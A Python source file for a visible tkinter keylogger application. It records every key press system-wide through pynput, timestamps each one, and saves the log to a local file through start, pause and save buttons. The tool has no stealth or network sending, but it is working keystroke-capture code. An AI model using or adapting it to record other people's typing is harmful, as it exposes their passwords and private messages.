import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json
from datetime import datetime

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("800x600")
        
        self.text = tk.Text(self.root, wrap=tk.WORD)
        self.text.pack(expand=True, fill='both')
        
        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.save_button = tk.Button(self.root, text="Save Keylog", command=self.save_keylog, state=tk.DISABLED)
        self.save_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.clear_button = tk.Button(self.root, text="Clear Keylog", command=self.clear_keylog, state=tk.DISABLED)
        self.clear_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.pause_button = tk.Button(self.root, text="Pause Keylogger", command=self.pause_keylogger, state=tk.DISABLED)
        self.pause_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.resume_button = tk.Button(self.root, text="Resume Keylogger", command=self.resume_keylogger, state=tk.DISABLED)
        self.resume_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.stats_label = tk.Label(self.root, text="")
        self.stats_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.filename_entry = tk.Entry(self.root, width=30)
        self.filename_entry.pack(side=tk.LEFT, padx=5, pady=5)
        self.filename_entry.insert(tk.END, "key_log.txt")
        
        self.keylog = []
        self.listener = None
        self.is_logging = False
        self.total_key_presses = 0
        
    def start_keylogger(self):
        self.is_logging = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.save_button.config(state=tk.DISABLED)
        self.clear_button.config(state=tk.DISABLED)
        self.pause_button.config(state=tk.NORMAL)
        self.resume_button.config(state=tk.DISABLED)
        self.filename_entry.config(state=tk.DISABLED)
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
    def stop_keylogger(self):
        self.is_logging = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.save_button.config(state=tk.NORMAL)
        self.clear_button.config(state=tk.NORMAL)
        self.pause_button.config(state=tk.DISABLED)
        self.resume_button.config(state=tk.DISABLED)
        self.filename_entry.config(state=tk.NORMAL)
        self.listener.stop()
        
    def pause_keylogger(self):
        self.is_logging = False
        self.pause_button.config(state=tk.DISABLED)
        self.resume_button.config(state=tk.NORMAL)
        
    def resume_keylogger(self):
        self.is_logging = True
        self.pause_button.config(state=tk.NORMAL)
        self.resume_button.config(state=tk.DISABLED)
        
    def on_press(self, key):
        if not self.is_logging:
            return
        try:
            key_str = str(key.char)
        except AttributeError:
            key_str = str(key)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.keylog.append(f"[{timestamp}] {key_str}")
        self.total_key_presses += 1
        self.update_stats()
        
    def update_text(self):
        self.text.delete(1.0, tk.END)
        self.text.insert(tk.END, '\n'.join(self.keylog))
        
    def update_stats(self):
        self.stats_label.config(text=f"Total Key Presses: {self.total_key_presses}")
        
    def save_keylog(self):
        file_name = self.filename_entry.get()
        try:
            with open(file_name, "a") as f:
                for item in self.keylog:
                    f.write(item + '\n')
            self.keylog = []
            self.total_key_presses = 0
            self.update_text()
            self.update_stats()
            messagebox.showinfo("Success", "Keylog saved successfully.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save keylog: {str(e)}")
        
    def clear_keylog(self):
        self.keylog = []
        self.total_key_presses = 0
        self.update_text()
        self.update_stats()
        
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()